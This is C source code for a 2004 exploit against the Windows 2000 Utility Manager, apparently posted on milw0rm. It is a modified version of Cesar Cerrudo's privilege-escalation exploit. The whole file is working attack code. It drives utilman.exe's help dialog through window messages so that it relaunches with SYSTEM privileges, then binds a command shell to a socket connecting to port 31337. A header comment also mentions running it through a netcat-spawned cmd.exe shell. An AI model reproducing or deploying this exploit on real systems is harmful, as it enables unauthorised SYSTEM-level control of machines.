/******************************************************************************************
 *****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4****
 **                                 [Crpt] Utility Manager exploit v2.666 modified by kralor [Crpt]                               **
*******************************************************************************************
 **   It gets system language and sets windows names to work on any win2k :P                                            **
 **   Feel free to add other languages :)                                                                                                   **
 **   v2.666: added autonomous (allinone) remote exploitation system ;)                                                    **
 **   It can be executed through poor cmd.exe shells (like nc -lp 666 -e cmd.exe from a                                **
 **   normal user account). Must be called with an argument (any argument)                                                 **
 **   You know where we are..                                                                                                                  **
 *****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4****
 ******************************************************************************************/
/* original disclaimer */
//by Cesar Cerrudo  sqlsec>at<yahoo.com
//Local elevation of priviliges exploit for Windows 2K Utility Manager (second one!!!!)
//Gives you a shell with system privileges
//If you have problems try changing Sleep() values.
/* end of original disclaimer */

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>
#include <io.h>

#pragma comment (lib,"ws2_32")

#define EXIT_SHELL "exit -shell"
#define HOST "localhost"
#define PORT 31337

struct {
 int id;
 char *utilman;
 char *winhelp;
 char *open;
} lang[] = {
	{ 0x0c,"Gestionnaire d'utilitaires","aide de Windows","Ouvrir" }, /* French  */
	{ 0x09,"Utility manager","Windows Help","Open" }		  /* English */
};

void print_lang(int id)
{
	char *lang_list[] = {"Neutral","Arabic","Bulgarian","Catalan","Chinese","Czech",
			     "Danish","German","Greek","English","Spanish","Finnish",
			     "French","Hebrew","Hungarian","Icelandic","italian",
			     "Japanese","Korean","Dutch","Norwegian","Polish",
			     "Portuguese","Romanian","Russian","Croatian","Serbian",
			     "Slovak","Albanian","Swedish","Thai","Turkish","Urdu",
			     "Indonesian","Ukrainian","Belarusian","Slovenian",
			     "Estonian","Latvian","Lithuanian","Farsi","Vietnamese",
			     "Armenian","Azeri","Basque","FYRO Macedonian","Afrikaans",
			     "Georgian","Faeroese","Hindi","Malay","Kazak","Kyrgyz",
			     "Swahili","Uzbek","Tatar","Not supported","Punjabi",
			     "Gujarati","Not supported","Tamil","Telugu","Kannada",
			     "Not supported","Not supported","Marathi","Sanskrit",
			     "Mongolian","Galician the best ;)","Konkani","Not supported",
			     "Not supported","Syriac","Not supported","Not supported",
			     "Divehi","Invariant"};
	printf("%s\r\n",lang_list[id]);
	return;
}

int cnx(char *host, int port)
{
	SOCKET sock;
	struct sockaddr_in yeah;
	struct hostent *she;
	PROCESS_INFORMATION ProcessInformation;
	STARTUPINFO si;

	printf("[i] should be called by myself, try with any argument to load the attack\r\n");
	fflush(stdout);
	sock = WSASocket(0x02,0x01,0x00,0x00,0x00,0x00);
	if(!sock) {
		printf("error: unable to create socket\r\n");
		return -1;
		}

	yeah.sin_family=AF_INET; 
	yeah.sin_addr.s_addr=inet_addr(host); 
	yeah.sin_port=htons((u_short)port);

if((she=gethostbyname(host))!=NULL) { 
	memcpy((char *)&yeah.sin_addr,she->h_addr,she->h_length); 
	} else { 
	if((yeah.sin_addr.s_addr=inet_addr(host))==INADDR_NONE) {
		printf("error: cannot resolve host\r\n");
		return -1;
		} 
	}
	if(connect(sock,(struct sockaddr*)&yeah,sizeof(yeah))!=0) {
		printf("error: connection refused\r\n");
		return -1;
		}

	si.cb = 0x44;
	si.lpReserved = 0x00;
	si.lpTitle = 0x00;
	si.lpDesktop = 0x00;
	si.dwX = 0x00;
	si.dwY = 0x00;
	si.dwXSize = 0x00;
	si.dwYSize = 0x00;
	si.wShowWindow = 0x00;
	si.lpReserved2 = 0x00;
	si.cbReserved2 = 0x00;

	si.dwFlags = 0x101;

	si.hStdInput  = (void *)sock;
	si.hStdOutput = (void *)sock;
	si.hStdError = (void *)sock;

	if(!CreateProcess(0x00, "cmd", 0x00, 0x00, 0x01, 0x10, 0x00, 0x00,&si, &ProcessInformation)) {
		printf("CreateProcess() error\r\n");
		return -1;
	}
	return 0;
}

void cmdshell(int sock)
{
	int length=666;
	char buffer[1024];

while(length) {
		length=read(0,buffer,sizeof(buffer));
		buffer[length]=0;
		if(!strncmp(buffer,EXIT_SHELL,strlen(EXIT_SHELL))) {
			send(sock,"exit\r\n",6,0);
			break;
			}
		length=send(sock,buffer,length,0);
		if (length<=0) {
			printf("[i] Connection closed.\n");
			exit(0);
		}
	}
	printf("[i] Connection successfully exited.\r\n");
	exit(0);
}

void wait_cnx(int port) {
	int sock, s,t;
	struct sockaddr_in my_addr;
	struct sockaddr_in their_addr;
    int sin_size;
	char buffer[4095];

if((sock = socket(AF_INET, SOCK_STREAM, 0))==-1) {
	printf("error: unable to create socket\r\n");
	exit(1);
	}
	my_addr.sin_family=AF_INET;        
	my_addr.sin_port=htons((u_short)port);
	my_addr.sin_addr.s_addr=INADDR_ANY; 
if(bind(sock, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))==-1) {
	printf("error: unable to bind socket on port %d\r\n",port);
	exit(1);
	}
if(listen(sock, 3)==-1) {
	printf("error: unable to listen\r\n");
	exit(1);
	}
	sin_size=sizeof(struct sockaddr_in);
	printf("[i] waiting connection on port %d\r\n",port);

if((s=accept(sock, (struct sockaddr *)&their_addr,&sin_size))==-1) {
	printf("error: unable to accept connection\r\n");
	exit(1);
	}
	memset(buffer,0,sizeof(buffer));
	printf("[i] host %s connected\r\n", inet_ntoa(their_addr.sin_addr));
	printf("[h] type 'exit -shell' to leave the shell\r\n\r\n");
	fflush(stdout);
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)cmdshell,(void*)s,0,&t);
	while((sin_size=recv(s,buffer,sizeof(buffer),0))>0) {
		buffer[sin_size]=0x00;
		printf("%s",buffer);
		fflush(stdout);
		}
	printf("\r\n[i] shell lost\r\n");
	return;
}

int set_lang(void)
{
	unsigned int lang_usr,lang_sys,id;

	id=GetSystemDefaultLangID();
	lang_sys=PRIMARYLANGID(id);
	id=GetUserDefaultLangID();
	lang_usr=PRIMARYLANGID(id);
	if(lang_usr!=lang_sys) {
		printf("warning: user language differs from system language\r\n\r\n");
		printf("1. system : ");print_lang(lang_sys);
		printf("2. user   : ");print_lang(lang_usr);printf("Select(1-2): ");
		fflush(stdout);
		id=getch();
	if(id!=49&&id!=50) {
		printf("wrong choice '%c', leaving.\r\n",id);
		exit(0);
		}
	if(id==49) {
		printf("system language\r\n");
		return lang_sys;
		}
	else
		printf("user language\r\n");
	}
	return lang_usr;
}

void banner()
{
	printf("\r\n\r\n\t[Crpt] Utility Manager exploit v2.666 modified by kralor [Crpt]\r\n");
	printf("\t\t\t  base code by Cesar Cerrudo\r\n");
	printf("\t     added autonomous (allinone) remote exploitation system\r\n");
	printf("\t\t\t   You know where we are...\r\n\r\n");
	fflush(stdout);
	return;
}

void give_magicshell(void)
{
	cnx(HOST,PORT);
	exit(0);
	return;
}

void enter_filename(HWND hwnd,char *filename,int size)
{
	unsigned int i;

	for(i=0;i<(unsigned int)size;i++)
		SendMessage(hwnd, WM_IME_KEYDOWN, toupper(filename[i]), 0);
	return;
}

int main(int argc, char* argv[])
{
    HWND lHandle, lHandle2;
    POINT point;
    char cmd[512];
	unsigned int i,j,t;
	int lang_id,path_len=1024;
	char *path;
	WSADATA wsa;
	HANDLE hdlr;

	banner();
	if(WSAStartup(0x101,&wsa)) {
		printf("error: unable to load winsock\r\n");
		return -1;
	}
if(argc==1)
	give_magicshell();

	hdlr=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)\
		 wait_cnx,(void*)PORT,0,&t);
	Sleep(1000);

	printf("[+] Gathering system language information\r\n");
	lang_id=set_lang();
	printf("[+] OK language ...");print_lang(lang_id);
	fflush(stdout);
	for(i=0;i<sizeof(lang)/sizeof(lang[0]);i++)
		if(lang[i].id==lang_id)
			break;
	if(i==sizeof(lang)/sizeof(lang[0])) {
		printf("error: undefined language.\r\n");
		return -1;
	}
	printf("[+] Trying to execute program with SYSTEM priviliges through utilman.exe\r\n");
	memset(cmd,0,sizeof(cmd));
	for(j=strlen(argv[0]);j>0;j--)
		if(argv[0][j]=='\\') {
			j++;break;
		}
	strncpy(cmd,&argv[0][j],508);
	if(cmd[strlen(cmd)-4]!='.')
		strcat(cmd,".exe");

	printf("prog: %s\r\n",cmd);
	cmd[strlen(cmd)-1]='?';
	fflush(stdout);
//  run utility manager
	WinExec("utilman.exe /start",SW_HIDE);
	Sleep(1000);

	lHandle=FindWindow(NULL, lang[i].utilman);   
    if (!lHandle) {
		printf("error: unable to start utilman.exe.\r\n");
		return 0;
	}

    PostMessage(lHandle,0x313,0,0); //=right click on the app button in the taskbar or Alt+Space Bar
	Sleep(100);

	SendMessage(lHandle,0x365,0,0x1); //send WM_COMMANDHELP  0x0365  lParam must be<>NULL 
	Sleep(300);
        
	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_IME_KEYDOWN, VK_RETURN, 0);
	Sleep(500);

        // find open file dialog window
	lHandle = FindWindow("#32770",lang[i].open);
    // get input box handle
    lHandle2 = GetDlgItem(lHandle, 0x47C);
    Sleep(500);

	path=(char*)malloc(path_len);
	GetCurrentDirectory(path_len,path);
	printf("path: %s\r\n",path);
    SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)path);
    SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);
	free(path);
	fflush(stdout);

    // set text to filter listview to display only cmd.exe
    SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)cmd);
    Sleep(800);

    // send return
    SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);

    //get navigation bar handle
    lHandle2 = GetDlgItem(lHandle, 0x4A0);
    
    //send tab
    SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
    Sleep(500);
    lHandle2 = FindWindowEx(lHandle,NULL,"SHELLDLL_DefView", NULL);
    //get list view handle
    lHandle2 = GetDlgItem(lHandle2, 0x1);

	enter_filename(lHandle2,cmd,strlen(cmd)-4);
    Sleep(500);

    //popup context menu
    PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
    Sleep(1000);

    // get context menu handle
    point.x =10; point.y =30;
    lHandle2=WindowFromPoint(point);

    SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
    SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
    SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0); // send return

    SendMessage (lHandle, WM_CLOSE,0,0); // close open file dialog window
    Sleep(500);

	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_CLOSE, 0, 0);// close open error window
	SendMessage (FindWindow(NULL, lang[i].utilman), WM_CLOSE, 0, 0);// close utilitymanager
	WaitForSingleObject(hdlr,INFINITE);
	WSACleanup();
	return 0;
}

// milw0rm.com [2004-07-20]
